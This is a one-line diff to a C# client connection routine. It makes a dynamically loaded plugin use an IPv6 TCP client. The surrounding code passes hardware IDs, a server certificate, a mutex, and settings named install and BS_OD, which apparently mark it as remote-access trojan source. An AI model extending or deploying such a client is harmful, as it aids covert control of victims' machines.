@@ -528,7 +528,7 @@ namespace Client.Connection
             dynamic instance = Activator.CreateInstance(type);
             if (IsConnectedV6)
             {
-                instance.Run(ClientSocket.TcpClient, Settings.Server_Certificate, Settings.Hw_id, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BS_OD, Settings.In_stall);
+                instance.Run(ClientSocket.TcpClientV6, Settings.Server_Certificate, Settings.Hw_id, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BS_OD, Settings.In_stall);
                 goto Next1;
             }
             else
